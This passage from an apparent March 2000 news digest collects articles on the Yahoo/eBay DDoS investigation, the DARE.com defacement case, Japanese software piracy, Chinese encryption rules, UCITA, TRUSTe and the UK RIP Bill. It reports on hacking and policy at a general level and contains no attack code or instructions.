      10-month suspended prison sentence for       cracking the banks' secret.

      Now that it is public, Humpich says, pirates could buy a chip card kit for 
      around $370 and be turning out false cards within weeks.

      ``A few weeks from now dozens of false cards are going to appear,'' he 
      told Liberation.

      No suspects in cyberattacks

      Investigators try to track down origin of last month's assaults

      BY DAVID L. WILSON       Mercury News Washington Bureau 

      WASHINGTON -- Federal authorities are continuing to investigate last 
      month's series of attacks on commercial Internet sites, but sources       
      close to the investigation say they have no suspects yet.

      Investigators are sifting through mountains of data, trying to track the 
      attacks back to their origin using logs from the computers involved, but       
      they concede that building a case using such methods may be difficult, if 
      not impossible. Some believe that a break in case is more likely to come 
      from more traditional methods.

      ``Often what you see in a cold case is a lead coming from someone who is 
      in custody on an unrelated minor charge who offers information in return 
      for a get-out-of-jail-free card,'' said one person with ties to       the 
      investigation. ``If somebody brags that he was behind this, eventually 
      somebody else will roll over on him.''

      Often, however, the braggarts are blowing smoke. For instance, a 
      17-year-old who goes by the moniker ``Coolio'' hinted in online chats that 
      he was behind at least some of the attacks. But federal authorities       
      say there is no evidence that the youth, Dennis Moran of Wolfboro, N.H., 
      was involved. However, Wednesday Moran was charged with two counts of 
      unauthorized access to a computer system in connection with vandalism to 
      the Los Angeles Police Department Web site DARE.com. 

      In last month's attacks on popular Web sites such as Yahoo, eBay and CNN, 
      suspects used a specialized technique known as a distributed denial of 
      service attack. The technique depends on stealth software       that has 
      been secretly installed on hundreds of computers connected to the 
      Internet. At a given signal, the programs attack a targeted Web site, 
      flooding it with so much data that normal business is impossible.

      Investigators are using log files from the computers infected with the 
      stealth software, hoping to track the trail back to the individual who 
      installed the programs, but they have been unsuccessful so far.

      The difficulties investigators face were summed up in a 60-page report the 
      federal government released Thursday. In a news conference discussing the 
      report, Attorney General Janet Reno said law       enforcement faces a 
      number of challenges in cyberspace.

      ``These challenges include the inability to trace criminals who hide their 
      identities online, difficulty in finding criminals who might be located in 
      other jurisdictions, the need for better coordination among law       
      enforcement agencies, and the need for trained personnel at all levels of 
      law enforcement,'' Reno told reporters.

      The report generally said that existing laws could deal with crimes in 
      cyberspace. In addition, while highlighting advantages criminals can gain 
      from anonymity on the Internet, the report stressed that anonymity       
      is both important and useful for average citizens. It suggested that any 
      proposed changes in the availability and use of anonymity must be 
      considered very carefully.

      Despite the report's measured tone, some groups feared a loss of privacy 
      for individuals who could find their every movement in cyberspace tracked 
      if they couldn't maintain anonymity.

      The American Civil Liberties Union blasted the report in a letter to Reno. 
      ``An end to Internet anonymity would chill free expression in 
      cyberspace,'' the letter declared. ``However, the report treats the       
      anonymity of Internet users as a `thorny issue' rather than a 
      constitutional right.''

      Administration officials said the report was merely a starting point for 
      an examination of security in cyberspace, and that the government was 
      fully committed to maintaining privacy for Internet users.

      two recent cases of piracy involving Internet bulletin

      was arrested for selling as many as 30 illegal copies of
      Microsoft's Office 2000 Professional and other software.
      He charged a total of 500,000 yen (US$4,693.51) for
      the CDR copies. A 24-year-old worker living in Takasaki,
      Gunma prefecture was also recently arrested for
      advertising and selling illegal software via an Internet
      bulletin board. He sold software to 20 people for
      100,000 yen (US$938.70). He said that he began selling
      pirated software after he purchased some in the same
      way.

      Pirated Software Sales Rampant on Internet Bulletin Board 
 
      March 13, 2000 (TOKYO) -- A series of recent cases have revealed the extent 
      to which Internet bulletin boards are being used in Japan to sell pirated 
      software.
 
      The Associated Computer Software Copyright Society (ACCS) disclosed the 
      extent of the situation on March 10.
 
      In just the last 10 days, two cases of copyright violation have been 
      brought to light by the Metropolitan Police Agency and the Aichi Prefecture 
      Police.
 
      On Feb. 29, the Metropolitan Police Agency submitted documents to the Tokyo 
      District Public Prosecutors Office regarding the activities of a 
      22-year-old Hokkaido University student living in Sapporo. The student was 
      using an electronic bulletin board to advertise the sale of pirated 
      software and was accepting orders via e-mail.
 
      The items included Microsoft's Office 2000 Professional as well as other 
      office and game software copied to CD-R disks without the copyright 
      holders' permission.
 
      Between February and October 1999, the student reportedly sold illegally 
      copied software to some 30 individuals nationwide for a total of about 
      500,000 yen. (106.53 yen = US$1)
 
      The other incident, uncovered by the high-tech crime unit of the Aichi 
      Prefecture Police, involved a 24-year-old worker living in Takasaki, Gunma 
      prefecture. A report on the suspect was submitted to the Nagoya District 
      Public Prosecutors Office on March 1.
 
      Like the Sapporo student, the suspect is accused of using a bulletin board 
      operated by a leading Internet service provider to advertise the sale of 
      pirated software and accept online orders. The accused is believed to have 
      sold the software to 20 people during the course of about one month, 
      generating some 100,000 yen in sales. He reportedly confessed that he began 
      selling pirated software after buying it in a similar manner himself.

      W O L F E B O R O,  N.H., March 13  Recently
      released court records explain how authorities
      traced the hacking attack on a popular anti-drug
      Web site to a Wolfeboro teenager. 
          Dennis Moran, 17, was charged last week with hacking
      into the Web site of DARE.org and defacing it with
      pro-drug abuse slogans and images.
           He has acknowledged he vandalized the Los
      Angeles-based site and two others, but said he was only
      joking when he claimed responsibility for the attacks that
      crippled Yahoo, eBay and other major sites last month.
           Court records released Friday show police began
      investigating Moran after noticing his Internet nickname,
      Coolio, on the defaced DARE.org site in November.
      
           At the bottom of the Web site were the messages
      Coolio is k-r4d and so are drugs and Craftily owned
      by Coolio :D. 

      Searching in Cyberspace
      Los Angeles Police Detective Michael Brausman used a
      search engine to find a Web page that included an e-mail
      address for Cooliok-r4d.com. He traced the address to
      another site that included a directory labeled Coolio.
      Inside the directory was one of the images posted on the
      DARE site.
      
           By late December, the detective had contacted the
      owner of an Arizona-based server who confirmed he had
      e-mail messages related to the Coolio directory. A search
      of the servers logs showed someone using the e-mail
      address cooliok-r4d.com had sent messages that included
      Morans name, address and phone number.
      
           In one message, Moran inquired about registering
      cool.io as an Internet domain name.
           
           If theres any way I could buy the domain for this,
      please email me pricing and information. Thanks, Dennis
      Moran, he wrote.
           
           Brausman called Wolfeboro police Dec. 30.
      Investigators interviewed Moran on Feb. 17.
           Moran faces two state charges of unauthorized access
      to a computer system. Each felony is punishable by up to
      15 years in prison and a $4,000 fine.
           
           Although Moran also was questioned by the FBI
      about several denial of service attacks on major
      commercial sites, including Yahoo.com and eBbay.com,
      no charges have been filed in those cases.
      
           Investigators said they were seeking someone using the
      Internet signer Coolio in those attacks, but also said the
      name is used by many people online.

      China softens rules on encryption
      By James Kynge - 13 Mar 2000 22:06GMT

      China has backed away from sweeping restrictions on the use and sale of foreign
      encryption technology that would have wreaked havoc on the use of foreign
      software, mobile phones, e-mail and other communications applications. 

      The US-China Business Council, which led a lobbying effort that united several
      national chambers of commerce in Beijing, said on Monday that Chinese
      authorities had agreed to "clarify" encryption regulations published in October last
      year. 

      The main sense of the clarification was that only hardware or software for which
      encryption is a core function will be limited by the regulations of the State
      Encryption Management Commission (SEMC), a body that reports to China's
      intelligence agency, the Ministry of State Security. 

      This means that mobile phone handsets, windows software, browser software
      and other applications that contain encryption as an ancillary function will not now
      be restricted. 

      Windows 2000, Microsoft Corp's newest operating system, which is set to be
      launched in China on March 20, was given approval for sale this month by
      authorities, prefiguring the relaxation in SEMC's rules. 

      It was not immediately clear what types of products would fall under the definition
      of having encryption as a core function. Under the SEMC's original restrictions, all
      businesses and individuals would have had to register with the government any
      products containing encryption technology. 

      They then would have had to apply for permission to use the goods. 

      But a clarification letter issued by the SEMC allayed fears the government would
      gain access to corporate secrets carried in encoded communications by requiring
      companies to hand over their encryption source codes. 

      Business travellers carrying laptops with ordinary software, even if it contains
      some encryption capabilities, are not required to register, the US-China Business
      Council quoted the SEMC as saying in a verbal clarification of the regulations.

      Interview: GNU guru Richard Stallman
      
      The president of the Free Software Foundation and founder of the 
      free-software movement speaks out against UCITA.

 

      By Robert Lemos, ZDNet News       March 12, 2000 3:44 PM PT 

 
                          When Richard Stallman founded the GNU (or Gnu's Not 
                          Unix) Project in 1984, his aim was to create 
                          Unix-compatible tools that were free. Sixteen years 
                          later, GNU software is a critical part of most Unix 
                          systems and forms the basis -- along with Linus 
                          Torvalds' Linux kernel -- of all Linux systems. 

      With the proposed Uniform Computer Information       Transaction Act 
      (UCITA) threatening the free-software movement, ZDNet News Senior Editor 
      Robert Lemos caught up with Stallman, president of the Free Software 
      Foundation, in India. 

      ZDNet: What will be the effect of UCITA on the free       software 
      movement? 

      Stallman: UCITA would make it       harder for us to avoid liability for 
      bugs that turn up in the free software we develop -- while giving 
      proprietary software developers a very easy way to avoid all liability for 
      their products, even for faults that they know about in advance. This is 
      grossly unfair. 

      UCITA would also give proprietary software developers a       way to 
      prohibit reverse engineering. They could then promulgate secret formats 
      for distributing and storing data and stop us from implementing free 
      software to handle those formats. We would be unable to provide you with 
      software to access your own data. 

      ZDNet: What will be the effect on GNU development?       What about 
      GNU/Linux? 

      Stallman: I don't expect UCITA to have any immediate       effect on our 
      software development. But in the long term we will probably have trouble 
      making our software handle the secret data formats and support new 
      hardware whose specifications are secret. 

      Microsoft already said they plan to use secret formats       and protocols 
      to block the development of (GNU/) Linux. The format of Word is already a 
      secret, and it is only through reverse engineering that people can figure 
      out anything about it. 

      ZDNet: Will software be worse because of UCITA? 

      Stallman: That is the wrong question. The right question       is how will 
      users of software be worse off because of UCITA? 

      I've already explained the problems free software will face.       We will 
      face additional obstacles to doing a good job. For non-free software, 
      developers will not face additional obstacles, but they will be able to 
      restrict the users in onerous ways. So even if the software is unchanged, 
      the users will be worse off. 

      For example, the owners will be able to change the       software license 
      at any time, restricting what you are allowed to do with a program. They 
      will be able to send you e-mail containing new conditions, and these new 
      conditions will be legally binding on you even if you never actually got 
      the mail. 

      If you do see the mail and you reject the new conditions,       they will 
      be able to demand that you stop using the program -- and even send your 
      machine a message across the network to turn off the program without a 
      moment's notice. 

      ZDNet: If there is so much opposition, why has the BSA,       and others, 
      had so much success in pushing the bill through? 

      Stallman: As far as I know, they have succeeded in one       state. The 
      term "so much success" seems to be an exaggeration. 

      I don't know why they succeeded in Virginia; I can only       guess. But 
      here are some things, which are not unusual, which may have happened this 
      time:

         1.The supporters of UCITA probably are better            organized and 
         have more money to contribute to election campaigns. 

         2.The legislators probably have not actually read            UCITA, and 
         that enabled supporters of UCITA to mislead them about both what UCITA 
         would do and why people oppose it. 

         3.The supporters of UCITA probably told the            legislators ... 
         that if Virginia passes UCITA and other states do not, some software 
         companies will move to Virginia. 

      State legislators and governors often give an       unreasonable amount of 
      emphasis to winning business to their states from other states. They often 
      do this without regard to whether the country as a whole will benefit or 
      suffer as a result. Business often uses this to manipulate states, to play 
      one state against another, to get what it wants. 

      The joke, though, is on them, because only retail Internet       sites 
      would move to Virginia, and the total employment of these sites would be 
      insignificant. The software
      development will remain where it is, in California,
     Washington, Bangalore or wherever.

     The privacy police? 
     TRUSTe CEO Bob Lewin explains how even sites selling
     personal data can get the nonprofit's privacy seal of approval.

     - - - - - - - - - - - -
     By Lydia Lee 

                 March 13, 2000 | When TRUSTe launched in
                 1996, the nonprofit promised to help the Internet
                 industry regulate itself with regard to protecting
                 surfers' privacy. Over the past three years, it has
     vetted the privacy policies of over 1,300 sites, and its
     black-and-green logo, which signals to visitors that a site actually
     abides by its policies, can be found on most major e-commerce
     sites. But what kind of teeth does the organization really have?

     TRUSTe didn't look so trusty last year when a security expert
     found that its licensee RealNetworks had been collecting user
     information on the sly. Instead of reprimanding the company, the
     nonprofit argued that because RealNetworks' privacy violations
     took place via its RealJukebox software, not its Web site, the
     incident was outside the purview of TRUSTe. More recently, it's
     been other privacy advocacy groups like JunkBusters that have
     alerted the public to privacy violations such as Intel's decision to
     include an identifier in its Pentium III chip; JunkBusters also
     started a campaign against DoubleClick's acquistion of Abacus
     when it was announced last June.

     But Bob Lewin, executive director and CEO of TRUSTe, says
     the group's privacy seal program plays an important role in
     enforcing privacy policies. Previously, Lewin was vice president
     of marketing at networking software company ISOCOR and
     before that at the open systems consortium X/Open Company.
     Now he heads up this nonprofit that charges between $300 and
     $4,999 to certify an e-commcerce site's privacy practices.

     What's the basic message you're giving to consumers when
     they see the TRUSTe symbol? Is it that the site isn't going
     to sell my data?

     The bottom line is that this site adheres to the fair information
     practices -- that they are disclosing what information they're
     collecting, why and if they're sharing that information with
     somebody. No 2: that they're giving the visitor the choice --
     whether to allow that to happen; 3) that once the information is
     collected, they will use reasonable security to protect that
     information; 4) that they allow the consumer reasonable access to
     that information to modify it.

     So if I were collecting consumers' e-mail addresses and
     then selling them to a direct-marketing company, would I
     still be able to get the TRUSTe symbol?

     Only if you stated that to the consumer in your privacy statement.
     If somebody came to us and said, "Here's our privacy statement.
     We will collect the e-mail addresses, and it's our intent to sell or
     share this information with these third parties, and we are giving
     you the option to say yes or no to this." Then that site could
     become a TRUSTe licensee.

     What percentage of sites get rejected?

     It's not a large percentage -- I'd guess 1 to 2 percent.

     What's the major reason sites get rejected?

     Once they start through the process, they can't or will not meet
     the requirements of the program. Say they'd like to be able to
     share info with a subsidiary, and we say, "That's to a third party,
     you have to disclose that." Well, they may voluntarily decide
     they're not going to proceed. Also, we don't apply our mark to
     gambling sites, since it's illegal in some states. The other reason
     that it happens, frankly, is that 85 percent of our sites are very
     small -- $10 million and below --- and as the process starts, the
     company goes out of business.

     If DoubleClick had been a TRUSTe member, would its
     decision to combine its database of anonymous surfing
     habits with an acquired database of personal information
     have set off red flags for you?

     There would be some issues. That's why we formed a third-party
     ad server committee, to get all the technical and legal issues out
     on the table. 

     They would have had to inform us before they changed their
     policy, and we would have had some discussions.
     
     Once it has the TRUSTe seal, have you ever kicked out a
     site for doing something?

     No, we've come very close, but we haven't had to do it. The
     escalation process is as follows: We get a complaint from a
     consumer about a licensee, and once we are assured that the
     consumer had previously contacted the Web site to try and get it
     resolved -- because a lot of these are just misunderstandings --
     we then contact the Web site and investigate and find out indeed
     if there's a real issue here. Now, the resolution to this may result
     in a change in the privacy policy, the business model, or what
     have you.

     Shouldn't you have caught that kind of stuff when you
     reviewed the policy in the first place?

     Well yes, but the nature of the beast is that all of this is software.
     What is generally the case is that there's been some unplanned
     feature in the software. Something will happen -- not that
     somebody wanted to do it, but the software allowed them to do
     it. So, when it happens, you point it out, it gets fixed and it's over.

     But that shouldn't mean they need to change their privacy
     policy, should it?

     It could be just a software change, but it could be a policy
     change. Let's say you implement software that shares information,
     or decide to collect more info than you originally stated --
     perhaps you're collecting IP addresses, or disseminating cookies.
     So you have to change your policy. This whole thing is not a static
     field. We do constant monitoring, but many of our licensees will
     communicate with us, and in fact one-third of our efforts is
     focused on working with them. As their Web sites evolve, we've
     got to ensure that the privacy statement evolves. It's an ongoing
     process.

     Would it be incumbent on the company to notify all the
     users who had seen the previous privacy policy?

     If they start collecting new information, then at that point in time,
     they have to communicate to users from this point forward, "We
     are also doing this." So that has to be stated clearly in the privacy
     statement. It would not impact people from beforehand because
     that information was not being collected. 

     But what if the people from beforehand come back and then
     they don't read the privacy policy? Is there anything in the
     TRUSTe program that says if you are instituting a new
     privacy policy, you have to let all the consumers from
     before know that?

     Well, we can't force consumers to read privacy statements, but in
     all our consumer outreach programs, we tell people: Even if
     you've visited this site before -- because things change -- the first
     thing to do is go to the privacy statement and review it to make
     sure there have been no changes. And we encourage licensees to
     put any changes up at the front. This is easier said than done --
     none of us like to read pages and pages of text.

     Have you ever blown the whistle on a company? 

     Yes, there are instances -- most of the problems are not with
     malice aforethought. The major monitoring is by consumers
     themselves, but we have people who look at the sites every
     quarter, to see if there've been any changes on the site. We also
     enter in names that we make up, opt-in in some cases and
     opt-out in others, so if we get communication to a name then we
     know where it came from.

     What role should the government have in enforcing online
     privacy?

     They play a very important role now, because they conduct
     studies on whether improvement has occurred within the industry
     -- the number of privacy statements, the quality of privacy
     statements. I think the government has clearly stated that certainly
     in the health-care and financial area, they feel the need to have
     some kind of legislation. They also did that for children --the
     Children's Online Privacy Protection Act. They've said that
     because this is super-sensitive information, you should have some
     guidelines. 

     Now, the question becomes, what vehicle do you use to enforce
     that legislation, which is equally important. We feel that seal
     programs -- and in particular, TRUSTe -- play a very important
     part there. COPPA is going into law April 21, and our contract
     will contain the elements for Web sites to adhere to COPPA
     requirements.

     But it seems like a lot for any one company to keep up
     with. With all these violations going on, it seems like there
     needs to be a more watchful eye.

     I would say that there is a watchful eye, if people look at the facts
     versus hype from some advocacy groups. It's all very well to run
     around screaming and yelling, "The sky is falling, the sky is
     falling," but the fact is, many of these issues that have come up are
     evolutions that occur in business models on the site. I would argue
     that the industry has demonstrated very quick response when
     those problems come up. 

     Take RealNetworks. The issue there occurred outside the scope
     of the current TRUSTe program. Yes, Real Networks is a
     TRUSTe licensee, but this particular issue had nothing to do with
     the collection of personal information on the Web site; it had to
     do with the collection of user information using software servers.
     Now, within a week, even though it was outside the program, we
     announced the formation of a pilot to evolve our program to
     handle those situations. I defy any government agency to do that.

     But customers aren't thinking, when they see the TRUSTe
     symbol, that it only covers the Web site. Maybe from the
     technical view it's different, but the consumer isn't going to
     make the distinction. Does the TRUSTe program cover
     both now?

     Yes, we need to do a better job so the consumer intuitively
     knows what the TRUSTe logo stands for. Ultimately, it would be
     great -- as we lay out the software privacy program -- to blend
     the two programs together. Or there may be a TRUSTe symbol
     for sites and one for software.

     What privacy issues are you trying to anticipate?

     One thing we're looking at is the wireless world, where we start
     talking about palm-held things and hand-held things and phones. I
     think there are some issues there we haven't fully addressed yet.
     We need to add more meat to the term "reasonable security."
     Today, that's the best term people have, because it can vary so
     much depending on the application and the technology. As we put
     more and more of these things into people's hands, we have to
     worry about how we prove that the person holding it is indeed the
     proper owner.

      Set to take effect in July 2001 the Uniform Computer

      Gilmore Signs 1st Internet Commercial Code Into Law  
      By Craig Timberg
      Washington Post Staff Writer
      Tuesday, March     14, 2000; 1:00 PM  
      
      Virginia Gov. James S. Gilmore III signed the nation's first set of 
      contractual rules specifically governing electronic commerce into law
      today on the second day of an Internet summit at George Mason University.

      The Uniform Computer Information Transaction Act, which is typically 
      called by its initials "UCITA," overwhelmingly passed the General 
      Assembly during the just-finished legislative session despite the 
      opposition of critics who contended it would erode basic consumer 
      rights. Because of that continuing debate, the law will not take 
      effect until July 2001 while lawmakers study the fine print. 

      Supporters such as Gilmore (R) say UCITA mainly updates for the 
      Information Age the commercial codes that states passed decades ago.
      UCITA essentially gives the force of law to software licensing 
      agreements as soon as a consumer rips the shrink-wrap off the box or
      hits the "I Accept" button on a program downloaded from the Internet.
       
      "UCITA provides clarity to contract law where none existed before,
      whichwill make it easier for consumers and industries to conduct 
      transactions viathe Internet," Gilmore said in a statement. "This
      increase in electronic transactions will perpetuate the Internet 
      revolution, promote e-commerce and foster the growth of Virginia's
      technology and manufacturing economies."
      
      State officials hope that by becoming the first state to adopt 
      UCITA, Virginia will further its reputation as a center of 
      high-technology and attract more businesses to the state.
      
      But consumer advocates warn that in the rush to adopt UCITA, 
      Virginia overlooked concerns that have caused two dozen attorneys
      general around the country, including Maryland's J. Joseph Curran Jr.
      (D) to write a letter voicing concerns.
      
      Consumer groups warn that UCITA will give software companies new 
      power to disable or "reposses" their products if they believe they
      are being used in a way that violates the licensing agreement. 
      Another worry, say consumer advocates, is that buyers won't always
      know the details of the licensing agreements until after the purchase
      is made.
      
      "The whole idea of informed shopping is based on disclosure before
      purchase," said Jean Ann Fox of the Virginia Citizens Consumer 
      Council, which lobbied against the bill.
      
      The signing took place at The 2000 Global Internet Summit at 
      George Mason's campus in Fairfax.

      03/14/2000 Fairfax, Va.  Flanked by the chairman of one
      of the state's largest businesses  America Online
      Inc.'s Steve Case  Virginia Gov. James Gilmore today
      signed the Uniform Computer Information Transactions
      Act (UCITA) into law. 
 
      But the bill won't take effect until July 2001, giving
      people and businesses with concerns about UCITA time
      to seek legislative amendments, the governor said. 
 
      "We're not deaf to people's concerns," said Gilmore.
      Still, Gilmore said he doesn't believe those concerns
      were "legitimate impediments" to the state's adoption
      of the legislation. 
 
      The year-delay for adoption came at the behest of a
      coalition of some of the state's largest nontechnology
      companies, who believe UCITA gives software vendors
      the upper hand in software licensing (see story). 
 
      "If there's any sense that things may not be quite right,
      there is plenty of time for people to come in under
      Virginia's approach and have a chance to do some
      amendments," said Gilmore. The state plans to create a
      study committee to examine the issues raised by the
      business coalition that sought to delay the law's
      implementation. 
 
      UCITA sets a series of default rules governing
      commercial software transactions. One of its most
      controversial provisions would allow a software vendor
      to automatically disable software in a contract dispute. 
 
      Case praised Virginia's action and said he hoped "other
      states will look at this and learn from this and embrace
      it." 
 
      Virginia is moving quickly on UCITA to help create an
      attractive climate for its technology businesses. For
      UCITA to become the law of the land, technically it
      must be adopted by 50 states. But companies may
      nonetheless cite UCITA in their license agreements. "If
      Virginia remains the only state that adopts this, then I
      believe that the certainty of our (actions) would attract
      additional businesses into the commonwealth," said
      Gilmore. 
 
      Maryland is also actively considering the legislation.

      Posted 14/03/2000 11:37am by Sean Fleming
    
      What the hell is... the UK's RIP Bill
    
      The UK Government's Regulatory Investigatory Powers (RIP) Bill goes before Select
      Committee in the House of Commons today and in a little more than six months it
      could be enshrined in law. But with 30 amendments tabled against it and an angry
      mob of opponents waiting to string it up, RIP has become better known for the
      widespread - and some might say kneejerk - reaction people have had to it, rather
      than for its aims and content. 
    
      Civil liberties groups, individual Net users and politicians from all the major UK parties
      are banding together to decry what is being labelled a Snoopers Charter. But just
      what is all the fuss about? The Blair administration has been slammed by many for its
      cronyism and control freakery, so is this just another example of Big Brother Blair
      wanting to watch over you at all times? 
    
      Growing pains 
      To become an accepted part of everyday life, and not just the place to go for
      cyberporn, e-fraud and to pick up your email, the Internet will have to appeal to a
      broader cross-section of the general public. Ecommerce, for example, will never thrive
      in a world where the majority of potential users and customers are too scared to part
      with their credit card details in case they get ripped off. The not-so-wired public need
      to feel confident about the Internet. This is all part of the natural evolution that all things
      go through when they achieve popularity. The days of the WWW Wild West are
      numbered. 
    
      So, what does the Bill propose and why are so many people objecting to it. The Bill
      describes itself as: "A Bill to make provision for and about the interception of
      communications, the acquisition and disclosure of data relating to communications,
      the carrying out of surveillance, the use of covert human intelligence sources and
      the acquisition of the means by which electronic data protected by encryption or
      passwords may be decrypted or accessed; to provide for the establishment of a
      tribunal with jurisdiction in relation to those matters, to entries on and interferences
      with property or with wireless telegraphy and to the carrying out of their functions by
      the Security Service, the Secret Intelligence Service and the Government
      Communications Headquarters; and for connected purposes." 
    
      Lots of spooky terms in there - "covert human intelligence sources" translates as
      spies - but in essence this is all about setting down a legal framework within which
      electronic communications are treated no differently from telephone tapping and
      intercepting mail (as in the paper stuff). Some people will throw their hands in the air
      at the very thought of any this but cracking down on the illegal use of the Internet by
      terrorists, perverts and organised criminals may be considered by many to be A Good
      Thing. 
    
      One size fits all 
      However, the Bill falls down - and in a big way - in the details. Or lack of them. It is
      vague on practicalities, and how permission to access private communication will be
      granted. ISPs will be obliged by law to have the facilities to log and monitor all the
      online activities of their users. But the Bill doesn't specify how this will be done. 
      And while there is talk of the Government reimbursing hardware costs with regard to
      monitoring, it doesn't make provision for the massive increase in overheads this will
      bring. 
    
      The Bill is also very vague in parts and can be interpreted in such a way that much of it
      becomes nonsensical. For example, it defines who will be covered by the Bill when it
      becomes law: "a person who provides a postal service, or b) a person who provides
      a public telecommunications service, or c) a person not falling within paragraph b)
      who has control of the whole or any part of a telecommunications system located
      wholly or partly in the UK." 
    
      ISPs, mobile phone companies, WAP service providers, news servers and so on all
      fall under the term "telecommunications service". Look at that definition again - it
      could mean anyone. 
    
      One of the Bill's fiercest critics is the organisation Stand. This is what Stand has to
      say on this point: "You're no longer using an ISP to connect to the Net. You're using the
      ISP's public telecommunication system." 
    
      The Bill also makes it an offence for you to be told that a surveillance warrant has ever
      been issued against you. That offence exists in perpetuity - there is no expiry date, you
      can never be told. And should anyone ever tell you they risk a prison sentence. 
    
      Someone to watch over me 
      Ah yes, you may be thinking, I live in a liberal democracy - the security forces can't just
      go round snooping on people willy nilly. Well, guess again. Here's what the Bill says
      about surveillance warrants. There are four main justifications given by the bill for
      issuing a warrant: 
      a) national security interests, 
      b) to prevent or detect serious crime, 
      c) to safeguard the UK's economic well being 
      d) for the purpose, in circumstances appearing to the Secretary of State to be
      equivalent to those in which he would issue a warrant by virtue of paragraph (b), of
      giving effect to the provisions of any international mutual assistance agreement. 
    
      And there's a list as long as your arm of those people who can issue the warrant
      against you - from senior police officers to "any such other personas the Secretary of
      State may by order designate". 
    
      Reading between the lines, the Bill says that the Home Secretary can - for any reason
      - issue a warrant against anyone, and that anyone with the Home Secretary's
      permission can do likewise. Don't forget, you'll never know if information has been
      gathered about you, what it was used for and so on. 
    
      Taking Liberties 
      As it stands, reader Simon Batistoni writes , The RIP Bill contains one truly frightening
      basic assumption: if you have stored on your computer any form of encrypted
      message, you will be forced on request by the police to hand over the necessary keys
      t decrypt this data. If you do not have the keys, YOU MUST PROVE THAT YOU
      HAVE NEVER BEEN IN POSSESSION OF THEM, or you could be subject to a
      two-year jail term. 
    
      The principle of the police being able to view encrypted data, so that they can nail
      paedophiles, drug dealers, etc, has some genuine merits. 
    
      The flaw in this measure, however, is that the recipient/possessor of encrypted data is
      guilty, until proven innocent, something which destroys the entire foundation of our
      legal system. What's more, it is impossible to prove that you never had something. 
    
      As it stands, the measures in the Bill could be applied to a PGP-encrypted signature
      on an email, currently used by many as a reliable means of identity verification. 
    
      Theoretically, the innocent father of a suspect under 
      surveillance, who receives an email from his son containing the standard encrypted
      signature, could fall under the scope of this RIP Bill; he could be jailed for failing to
      reveal the contents of the encrypted data. 
    
      Ostriches need not apply 
      Small wonder that there is so much opposition to the Bill. There are many more
      examples of the above thinking running throughout the Bill, such as the loophole that
      could mean you have to keep tabs on yourself but can never let yourself know,
      otherwise you end up in prison. Stand has done a much more comprehensive job of
      examining RIP than The Register is able to do and its site is well worth a visit. 
    
      Don't be fooled into thinking that your Government will always have your best interests
      at heart, because that's not the way of Governments. But at the same time, don't
      assume that any attempt to regulate the Internet is an invasion of rights and freedoms -
      freedom without responsibility is, after all, little more than latent tyranny. We will all be
      affected by the RIP Bill when it becomes law - as it almost certainly will, in some form
      or another - so now is the time to find out a little more about it and decide where you
      stand, because in another six months it could all be too late.

      New York teen-ager win $100,000 with encryption research WASHINGTON (AP) -- A 
      17-year-old Romanian-born girl who embedded a computer message in the gene 
      sequence of a strand of DNA has been named the best young scientist in the 
      country.
      
      Viviana Risca, a senior at Paul D. Schreiber High School in Port Washington, 
      N.Y., won a $100,000 college scholarship when she bested 10 other high school 
      seniors on Monday in the 59th Intel Science Talent Search competition.
      
      Risca said her project in steganography, a data encryption technology that 
      allows a computer user to hide a file within another file, was a simple one. 
      Risca, who emigrated from Romania eight years ago, embedded the secret message 
      ``June 6 Invasion: Normandy.''
      
      Technologies like steganography can protect sensitive electronic information 
      from interception or eavesdropping, but they can also wreak havoc if used by 
      terrorists and criminals.
      
      Formerly known as the Westinghouse Science Talent Search, the contest has been 
      nicknamed the ``Junior Nobel Prize.'' Past winners include five Nobel laureates, 
      nine MacArthur Foundation fellows and two Fields medalists.
      
      Forty finalists came here to compete for the award.
      
      Jayce Getz, a senior at Big Sky High School in Missoula, Mont., won second prize 
      and a $75,000 scholarship for a math project on partition function. And Feng 
      Zhang, a senior at Theodore Roosevelt High School in Des Moines, Iowa, won third 
      prize and a $50,000 scholarship for a biochemistry project in molecular 
      virology.
      
      The other winners in the top 10, their schools, the amounts of their 
      scholarships and their projects were: Alexander Schwartz, Radnor (Pa.) High

      Army on hacker alert 
 
      BY Dan Verton 
      Updated 03/16/2000 at 17:05 EST 
 
      HOUSTON  The Army has placed its cyberdefense teams on full alert after a known
      hacker group threatened to take down the Army's World Wide Web home page this
      Friday. 
 
      On Tuesday evening the Army placed its cyberdefenders at the Land Information
      Warfare center at Fort Belvoir, Va., on full alert after a group known as the Boys
      from Brazil threatened to hack into the Army home page on Friday. 
 
      But today the Army clarified that the hacker group it is watching is Hacking for
      Girliez, which took down the New York Times' site in September 1998. Most of the
      hackers' remarks appeared in comment tags, which can be seen in source material
      but not on a Web page. The tags include such remarks as "'Immature kids' were able
      to bypass...$25,000 firewalls [and] bypass the security put there." 
 
      Philip Loranger, chief of the Command and Control Protect Division in the Army's
      Information Assurance Office, speaking here at the 2000 Army Directors of
      Information Management Conference, said the Army is prepared for any attack
      against the its Web site. 
 
      "We've had to activate some countermeasures to protect the Army home page,"
      Loranger said, declining to provide specifics for security reasons. However, he said
      the countermeasures being put in place do not include disconnecting the Army site
      from the Internet. 
 
      Specific details emerged today on some of the steps the Army has taken in the past
      few months to prepare for these types of attacks. Lt. Col. James Withers, a
      systems engineering specialist with the Army signal command, said the Army's
      regional CERTs have written special software scripts that will help defend against
      known hacker tactics. The Army also developed Web cache proxy servers that
      divert Web surfers away from primary servers residing behind firewalls on Army
      installations. 
 
      The Army is also in the process of deploying a protected domain name system
      architecture that will help the service regain control of all Army Internet sites and
      network entry points. 
 
      "We know the hackers mapped [the old architecture]," Withers said, adding that 90
      percent of the Army's global protected DNS architecture should be completed by
      April. 
 
      Loranger demonstrated for conference attendees how simple it is for hackers to
      exploit known operating system vulnerabilities using widely available hacker tools and
      standard systems administrator procedures. In fact, Loranger, with the approval of
      the Army's staff counsel, demonstrated a live hacking of another computer system
      to show how within minutes hackers can crack into known password vulnerabilities
      and take over entire systems and networks. 
 
      Loranger also said that the lack of international laws governing conduct on the
      Internet poses real obstacles to the government's ability to respond to
      foreign-based hacker attacks. Loranger pointed out that some graduate-level
      computer education schools in India, for example, have established hacking into U.S.
      government systems as an academic requirement. 
 
      Lt. Col. LeRoy Lundgren, program manager for the Army's National Security
      Improvement Program, said as many as 285,000 network queries were denied by
      Army security systems last year because of the questionable method used.
      Lundgren added that the Army has seen an increase in the number of queries
      originating in foreign countries, particularly China and Bulgaria.

      the agency has shut down access to queries emanating from Brazil until the 
      agency's security team makes some necessary improvements to its       
      network. 

      O'Donnell said that the Brazil shutout was not a "blacklist" attempt, as 
